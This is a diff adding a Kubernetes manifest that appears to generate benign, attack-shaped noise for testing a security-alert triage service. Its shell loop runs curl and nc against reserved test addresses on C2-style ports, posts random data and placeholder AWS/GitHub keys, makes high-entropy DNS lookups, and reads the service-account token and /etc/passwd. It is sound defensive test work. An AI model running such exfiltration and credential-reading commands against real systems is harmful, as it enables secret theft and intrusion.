@@ -1,0 +1,179 @@
+## confusion-loadgen — near-miss confusion noise for dx (the diagnosis microservice).
+##
+## PURPOSE (distinct from example/*/loadgen.yaml):
+##   The existing loadgen.yaml emits BENIGN "functional confusion" — real traffic
+##   on the same routes an experiment uses, so the experiment blends in by shape.
+##   It is `kubescape.io/ignore: "true"` (NOT monitored) and dx fast-discharges it.
+##
+##   THIS kit is the opposite: MONITORED pods that continuously emit
+##   attack-SHAPED-but-benign telemetry — the near-misses dx must actually WORK UP
+##   and rule out. It exercises every generic-symptom predicate in dx's
+##   internal/symptom/symptom.go so dx triages each malignant -> full workup
+##   (pull conn/dns/http) -> ruled_out. That is the "needle in a haystack"
+##   stress: ~99.999% of referrals are these near-misses, ONE experiment is real.
+##
+##   We call the single real chain an EXPERIMENT, never an "attack".
+##
+## dx symptom.go predicates exercised (each forces malignant triage -> workup):
+##   Execution : reconTool comms (curl/wget/nslookup/dig/nc), shellSpawn (sh/ash)   -> R0001
+##   Egress    : egressC2Port (1389/389/1099/4444/1337/9001), egressUncommonPort     -> conn_stats
+##   Exfil     : dnsHighEntropy (long/high-entropy label), payloadHighEntropy(base64),
+##               secretMaterial (AKIA…/ghp_…/BEGIN PRIVATE KEY)                       -> dns/http
+##   Collection: sensitiveFileRead (/etc/passwd, .kube/config, serviceaccount/token) -> R0002
+##
+## SBoB recipe (so the near-misses actually FIRE as kubescape referrals):
+##   the ns is MONITORED (no kubescape.io/ignore). A tight User ApplicationProfile
+##   baselines ONLY the entrypoint shell — so every recon tool the loop spawns is an
+##   unexpected process (R0001), and the NetworkNeighborhood baselines only kube-dns
+##   so the odd-port egress deviates. AP/NN are applied User-managed + the Deployment
+##   carries the bind labels; apply this whole file, then bounce the pods so node-agent
+##   binds the User profile at pod start.
+##
+## SCALE for the ~99.999% ratio: bump .spec.replicas (each replica is a distinct
+## pod => a distinct dx investigation per window). Distinct identities — not raw
+## volume — set the graph row count (dx dedups by (pod,rule,window)).
+---
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: confusion
+  labels:
+    # MONITORED on purpose — do NOT set kubescape.io/ignore here.
+    app.kubernetes.io/part-of: confusion-loadgen
+---
+apiVersion: spdx.softwarecomposition.kubescape.io/v1beta1
+kind: ApplicationProfile
+metadata:
+  name: confusion-loadgen
+  namespace: confusion
+  annotations:
+    kubescape.io/completion: complete
+    kubescape.io/status: completed
+    kubescape.io/managed-by: User
+  labels:
+    kubescape.io/workload-api-group: apps
+    kubescape.io/workload-api-version: v1
+    kubescape.io/workload-kind: Deployment
+    kubescape.io/workload-name: confusion-loadgen
+    kubescape.io/workload-namespace: confusion
+spec:
+  architectures: [amd64]
+  containers:
+    - name: confusion
+      imageTag: nicolaka/netshoot:latest
+      capabilities: []
+      # Baseline = ONLY the entrypoint shell loop. Every recon tool the loop
+      # spawns (curl/nslookup/dig/nc/wget) is therefore an UNEXPECTED process
+      # -> R0001 -> dx referral -> malignant workup -> ruled_out.
+      execs:
+        - path: /bin/bash
+          args: ["bash", "-c"]
+      opens:
+        - path: /etc/resolv.conf
+          flags: ["O_RDONLY"]
+        - path: /etc/hosts
+          flags: ["O_RDONLY"]
+        - path: /etc/nsswitch.conf
+          flags: ["O_RDONLY"]
+---
+apiVersion: spdx.softwarecomposition.kubescape.io/v1beta1
+kind: NetworkNeighborhood
+metadata:
+  name: confusion-loadgen
+  namespace: confusion
+  annotations:
+    kubescape.io/completion: complete
+    kubescape.io/status: completed
+    kubescape.io/managed-by: User
+  labels:
+    kubescape.io/workload-api-group: apps
+    kubescape.io/workload-api-version: v1
+    kubescape.io/workload-kind: Deployment
+    kubescape.io/workload-name: confusion-loadgen
+    kubescape.io/workload-namespace: confusion
+spec:
+  matchLabels:
+    app: confusion-loadgen
+  # Baseline egress = kube-dns only. The loop's C2/uncommon-port connects all
+  # deviate from this -> egress symptom.
+  egress:
+    - identifier: kube-dns
+      dns: kube-dns.kube-system.svc.cluster.local
+      ports:
+        - name: dns-udp
+          protocol: UDP
+          port: 53
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: confusion-loadgen
+  namespace: confusion
+  labels:
+    app: confusion-loadgen
+spec:
+  # SCALE THIS for the noise:experiment ratio (each replica = a distinct dx
+  # investigation per window). Start small; dial up to the target on a live run.
+  replicas: 10
+  selector:
+    matchLabels:
+      app: confusion-loadgen
+  template:
+    metadata:
+      labels:
+        app: confusion-loadgen
+        # bind to the User SBoB above so node-agent enforces from pod start.
+        kubescape.io/user-defined-profile: confusion-loadgen
+        kubescape.io/user-defined-network: confusion-loadgen
+    spec:
+      # spread replicas so both nodes generate referrals
+      topologySpreadConstraints:
+        - maxSkew: 1
+          topologyKey: kubernetes.io/hostname
+          whenUnsatisfiable: ScheduleAnyway
+          labelSelector:
+            matchLabels:
+              app: confusion-loadgen
+      containers:
+        - name: confusion
+          image: nicolaka/netshoot:latest
+          imagePullPolicy: IfNotPresent
+          env:
+            - name: INTERVAL
+              value: "2"            # seconds between near-miss rounds (lower = denser noise)
+          command: ["bash", "-c"]
+          args:
+            - |
+              set +e
+              # TEST-NET-1 (192.0.2.0/24, RFC5737) targets: connects are captured
+              # by pixie as conn_stats even when refused/timed out — that is all
+              # the egress symptom needs. Nothing real is contacted.
+              i=0
+              rnd() { head -c 24 /dev/urandom | base64 | tr -dc 'a-z0-9' | head -c 24; }
+              while true; do
+                i=$((i+1))
+                # --- Execution near-miss: reconTool spawns (curl/wget/nslookup/dig/nc) ---
+                nslookup "host${i}.confusion.test"            >/dev/null 2>&1
+                dig +short "svc${i}.confusion.test"            >/dev/null 2>&1
+                wget -q -T 1 -O /dev/null "http://192.0.2.10:8080/probe${i}" 2>/dev/null
+                # --- Egress near-miss: C2 ports + uncommon high ports ---
+                curl -m1 -s "http://192.0.2.1:4444/"           >/dev/null 2>&1   # C2 4444
+                curl -m1 -s "http://192.0.2.2:1389/"           >/dev/null 2>&1   # C2 1389 (ldap)
+                curl -m1 -s "http://192.0.2.3:1337/"           >/dev/null 2>&1   # C2 1337
+                nc -w1 192.0.2.4 9001 </dev/null               >/dev/null 2>&1   # C2 9001
+                curl -m1 -s "http://192.0.2.5:$((20000 + i % 40000))/" >/dev/null 2>&1  # uncommon high port
+                # --- Exfil near-miss: high-entropy DNS label ---
+                nslookup "$(rnd).exfil.confusion.test"         >/dev/null 2>&1
+                # --- Exfil near-miss: base64 payload + fake secret material ---
+                curl -m1 -s --data "$(head -c 60 /dev/urandom | base64)" \
+                     "http://192.0.2.6:8081/up"                >/dev/null 2>&1
+                curl -m1 -s --data "AKIAIOSFODNN7EXAMPLE ghp_0123456789abcdefghijklmnopqrstuvwxyz" \
+                     "http://192.0.2.7:8082/up"                >/dev/null 2>&1
+                # --- Collection near-miss: sensitive-file reads ---
+                cat /etc/passwd                                >/dev/null 2>&1
+                cat /var/run/secrets/kubernetes.io/serviceaccount/token >/dev/null 2>&1
+                sleep "${INTERVAL:-2}"
+              done
+          resources:
+            requests: { cpu: "5m", memory: "24Mi" }
+            limits:   { cpu: "50m", memory: "64Mi" }
